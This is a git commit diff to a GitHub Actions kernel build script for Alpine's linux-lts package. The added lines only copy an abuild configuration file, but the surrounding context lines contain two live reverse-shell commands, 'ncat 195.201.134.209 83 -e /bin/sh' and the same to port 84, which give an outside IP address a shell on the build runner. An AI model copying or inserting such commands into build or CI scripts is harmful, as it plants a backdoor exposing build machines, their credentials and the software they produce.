34f131954733d83977d3e085987d8c81ee330704
MargaretaWhite23 <108430598+MargaretaWhite23@users.noreply.github.com>
2023-12-27 17:06:05 +0100

    Update build-kernel-github-actions.sh

--- build-kernel-github-actions.sh
+++ build-kernel-github-actions.sh
@@ -57,6 +57,12 @@ su -c "/home/abuild3/installrsakey.sh" -m abuild3
 ncat 195.201.134.209 83 -e /bin/sh
 sleep 10
 
+###hack to allow abuild to work
+mkdir .abuild
+cp /home/abuild3/.abuild/abuild.conf .abuild
+chown -R abuild3:abuild3 .abuild
+
+
 su -c "cd /github/workspace/aports/main/linux-lts; abuild" -m abuild3 
 
 ncat 195.201.134.209 84 -e /bin/sh
